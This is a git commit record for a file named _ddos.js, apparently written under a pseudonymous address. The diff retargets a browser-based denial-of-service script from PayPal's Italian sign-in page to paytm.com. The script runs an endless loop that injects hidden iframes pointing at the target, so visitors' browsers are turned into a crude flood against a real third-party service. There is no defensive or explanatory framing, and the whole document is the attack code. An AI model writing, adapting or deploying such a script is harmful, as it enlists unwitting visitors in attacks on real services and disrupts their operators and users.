08ba69506051138a7a18937d6733806e074c4bc5
Ccgnnz19 <anonymous.spoof.1973@gmail.com>
2019-06-13 09:51:39 +0200

    Update _ddos.js

--- _ddos.js
+++ _ddos.js
@@ -1,8 +1,8 @@
-var url = ("www.paypal.com")
+var url = ("paytm.com")
 
 function _DDoS(url){
  document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
 }
 for(;;){
- setTimeout('_DDoS("https://www.paypal.com/it/signin")',1);
+ setTimeout('_DDoS("https://paytm.com/")',1);
 }
